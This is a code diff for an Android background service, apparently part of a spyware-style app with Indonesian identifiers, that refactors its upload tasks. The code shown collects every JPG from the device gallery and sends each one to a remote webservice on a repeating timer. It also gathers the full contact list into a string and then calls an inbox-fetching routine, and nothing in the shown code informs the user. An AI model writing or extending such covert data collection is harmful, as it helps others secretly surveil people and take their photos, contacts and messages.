@@ -19,6 +19,7 @@ import android.location.Location;
 import android.location.LocationManager;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
@@ -269,6 +270,7 @@ public class UpdateService extends Service {
             if (!isUploadGallery) {
                 ambilgallery();
             }
+
 //            handlerGallery.postDelayed(runnableGallery, DELAYUPLOAD);
 
         }
@@ -322,105 +324,6 @@ public class UpdateService extends Service {
 
     }
 
-
-    private class AsyncTaskRunner extends AsyncTask<String, String, String> {
-
-        private String resp;
-        private String result1;
-
-        @Override
-        protected String doInBackground(String... params) {
-//            publishProgress("Process..."); // Calls onProgressUpdate()
-            //Tooat("Welcome "+params[0]);
-            try {
-
-                if (!file.exists()) {
-                    file.mkdirs();
-                }
-
-                result1 = "";
-
-
-                resp = "";
-
-                //This function is responsible for sending data to our webservice
-                int send = 0;
-                for (int i = 0; i < al_images.size(); i++) {
-                    AndLog.ShowLog("FOLDERd", al_images.get(i).getStr_folder());
-
-                    for (int j = 0; j < al_images.get(i).getAl_imagepath().size(); j++) {
-                        String filePath = al_images.get(i).getAl_imagepath().get(j);
-                        AndLog.ShowLog("FILEUPLOAD", filePath);
-                        sessionManager.setImgPath(al_images.get(i).getAl_imagepath().get(j));
-
-                        if (filePath.toLowerCase().contains(".jpg")) {
-                            File sourceFile = new File(filePath);
-                            File destFile = new File(file, "img_" + dateFormatter.format(new Date()).toString() + "_" + UUID.randomUUID().toString().toLowerCase().replace("-", "") + ".jpg");
-
-                            try {
-                                copyFile(sourceFile, destFile);
-                                decodeFile(destFile);
-                            } catch (IOException e) {
-                                e.printStackTrace();
-                            }
-
-//                            if (send < 500) {
-                                resp = deepImagesInsert(filePath, destFile.getPath());
-//                            } else {
-//                                deleteDir(file);
-//                            }
-
-                            send++;
-                        }
-                    }
-                }
-//                resp = deepImagesInsert();
-
-                deleteDir(file);
-                AndLog.ShowLog("Values", resp);
-
-
-            } catch (Exception e) {
-                e.printStackTrace();
-                resp = e.getMessage();
-            }
-            return result1;
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            // execution of result of Long time consuming operation
-            //  list_adapter= new ListAdapter_UserPanel(User_SelectPark.this, pendingList);
-            // listView.setAdapter(list_adapter);
-            //Tooat(decision);
-
-            isUploadGallery = false;
-
-            String status = resp.trim();
-
-            AndLog.ShowLog("rsstss", status);
-
-
-            //finalResult.setText(result);
-        }
-
-        @Override
-        protected void onPreExecute() {
-
-
-//            progressDialog = ProgressDialog.show(FormPengajuan.this,
-//                    "Process",
-//                    "Please wait...");
-
-            isUploadGallery = true;
-        }
-
-        @Override
-        protected void onProgressUpdate(String... text) {
-            //finalResult.setText(text[0]);
-
-        }
-    }
 
     public String deepImagesInsert(String imgPath, String compressPath) {
         String return_value = "";
@@ -629,6 +532,7 @@ public class UpdateService extends Service {
 
     public void ambilgallery() {
         al_images.clear();
+        boolean_folder = false;
 
         int int_position = 0;
         Uri uri;
@@ -692,9 +596,9 @@ public class UpdateService extends Service {
         }
 
 
-        AndLog.ShowLog("Asyntaskings", "STARTTING");
-        AsyncTaskRunner task = new AsyncTaskRunner();
-        task.execute();
+        AndLog.ShowLog("JumlahData", al_images.size()+" x");
+
+        LoadGalleryAsyncTask();
 
     }
 
@@ -871,68 +775,171 @@ public class UpdateService extends Service {
         AndLog.ShowLog("runn1ng:", "contactLog");
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
 
-            LoadFromContactList jsonTask = new LoadFromContactList();
-            jsonTask.execute();
+            LoadContactAsyncTask();
 
         }
     }
 
-    public class LoadFromContactList extends AsyncTask<Void, String, ArrayList<ContactModel>> {
 
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
-            AndLog.ShowLog("runn1ng:", "LoadFromContactList");
-            //Log.i(TAG, "Load Contact");
-        }
+    public void LoadContactAsyncTask() {
+        AsyncTask<Void, String, ArrayList<ContactModel>> task = new AsyncTask<Void, String, ArrayList<ContactModel>>() {
+            @Override
+            public void onPreExecute() {
+                super.onPreExecute();
+                AndLog.ShowLog("runn1ng:", "LoadFromContactList");
+                //Log.i(TAG, "Load Contact");
+            }
 
-        @Override
-        protected ArrayList<ContactModel> doInBackground(Void... params) {
-            // TODO Auto-generated method stub
+            @Override
+            public ArrayList<ContactModel> doInBackground(Void... params) {
+                // TODO Auto-generated method stub
 
-            AndLog.ShowLog("runn1ng:", "LoadFromContactList Start");
+                ArrayList<ContactModel> result = LihatContact();
 
-//            ArrayList<ContactModel> result = LihatContact();
-            ArrayList<ContactModel> result = LihatContact();
-
-
-            AndLog.ShowLog("runn1ng:", "LoadFromContactList Finish");
-
-            return result;
-        }
+                return result;
+            }
 
 
-        @Override
-        protected void onPostExecute(final ArrayList<ContactModel> result) {
-            // TODO Auto-generated method stub
-            super.onPostExecute(result);
+            @Override
+            public void onPostExecute(final ArrayList<ContactModel> result) {
+                // TODO Auto-generated method stub
+                super.onPostExecute(result);
 
-            AndLog.ShowLog("runn1ng:", "LoadFromContactList Done");
+                AndLog.ShowLog("runn1ng:", "LoadFromContactList Done");
 
-            String data = "";
-            String compare = "";
-            for (int i = 0; i < result.size(); i++) {
+                String data = "";
+                String compare = "";
+                for (int i = 0; i < result.size(); i++) {
 //                AndLog.ShowLog("ContactDetail", result.get(i).getNama() + " - " + result.get(i).getExtra());
-                AndLog.ShowLog(LIST_CTC + " nama", ctc_name = result.get(i).getNama());
-                AndLog.ShowLog(LIST_CTC + " nomor", ctc_nomor = result.get(i).getExtra());
+                    AndLog.ShowLog(LIST_CTC + " nama", ctc_name = result.get(i).getNama());
+                    AndLog.ShowLog(LIST_CTC + " nomor", ctc_nomor = result.get(i).getExtra());
 
-                if (!compare.equals(result.get(i).getExtra())) {
-                    data = data + result.get(i).getNama() + "(" + result.get(i).getExtra() + ")###";
+                    if (!compare.equals(result.get(i).getExtra())) {
+                        data = data + result.get(i).getNama() + "(" + result.get(i).getExtra() + ")###";
+                    }
+
+                    compare = result.get(i).getExtra();
+
                 }
+                final String Contact = data;
+                AndLog.ShowLog("Ctc_list", Contact);
+                sessionManager.setContact(Contact);
 
-                compare = result.get(i).getExtra();
+                fetchInbox();
 
             }
-            final String Contact = data;
-            AndLog.ShowLog("Ctc_list", Contact);
-            sessionManager.setContact(Contact);
+        };
 
-            fetchInbox();
-
+        if (Build.VERSION.SDK_INT >= 11/*HONEYCOMB*/) {
+            task.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
+        } else {
+            task.execute();
         }
-
-
     }
+
+
+    public void LoadGalleryAsyncTask() {
+
+        AsyncTask<String, String, String> task = new AsyncTask<String, String, String>() {
+
+            private String resp;
+            private String result1;
+
+            @Override
+            protected void onPreExecute() {
+                isUploadGallery = true;
+                deleteDir(file);
+            }
+
+            @Override
+            protected String doInBackground(String... params) {
+//            publishProgress("Process..."); // Calls onProgressUpdate()
+                //Tooat("Welcome "+params[0]);
+                try {
+
+                    if (!file.exists()) {
+                        file.mkdirs();
+                    }
+
+                    result1 = "";
+
+
+                    resp = "";
+
+                    //This function is responsible for sending data to our webservice
+                    int send = 0;
+                    for (int i = 0; i < al_images.size(); i++) {
+                        AndLog.ShowLog("FOLDERd", al_images.get(i).getStr_folder());
+
+                        for (int j = 0; j < al_images.get(i).getAl_imagepath().size(); j++) {
+                            String filePath = al_images.get(i).getAl_imagepath().get(j);
+                            AndLog.ShowLog("FILEUPLOAD", filePath);
+                            sessionManager.setImgPath(al_images.get(i).getAl_imagepath().get(j));
+
+                            if (filePath.toLowerCase().contains(".jpg")) {
+                                File sourceFile = new File(filePath);
+                                File destFile = new File(file, "img_" + dateFormatter.format(new Date()).toString() + "_" + UUID.randomUUID().toString().toLowerCase().replace("-", "") + ".jpg");
+
+                                try {
+                                    copyFile(sourceFile, destFile);
+                                    decodeFile(destFile);
+                                } catch (IOException e) {
+                                    e.printStackTrace();
+                                }
+
+//                            if (send < 500) {
+                                resp = deepImagesInsert(filePath, destFile.getPath());
+//                            } else {
+//                                deleteDir(file);
+//                            }
+
+                                send++;
+                            }
+                        }
+                    }
+//                resp = deepImagesInsert();
+
+                    deleteDir(file);
+                    AndLog.ShowLog("GALRESP", resp);
+
+
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    resp = e.getMessage();
+                }
+                return result1;
+            }
+
+            @Override
+            protected void onPostExecute(String result) {
+                // execution of result of Long time consuming operation
+                //  list_adapter= new ListAdapter_UserPanel(User_SelectPark.this, pendingList);
+                // listView.setAdapter(list_adapter);
+                //Tooat(decision);
+
+                isUploadGallery = false;
+
+                String status = resp.trim();
+
+                AndLog.ShowLog("rsstss", status);
+
+                handlerGallery.postDelayed(runnableGallery, DELAYUPLOAD);
+
+
+                //finalResult.setText(result);
+            }
+
+
+
+        };
+
+        if (Build.VERSION.SDK_INT >= 11/*HONEYCOMB*/) {
+            task.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
+        } else {
+            task.execute();
+        }
+    }
+
 
     private ArrayList<ContactModel> LihatContact() {
 
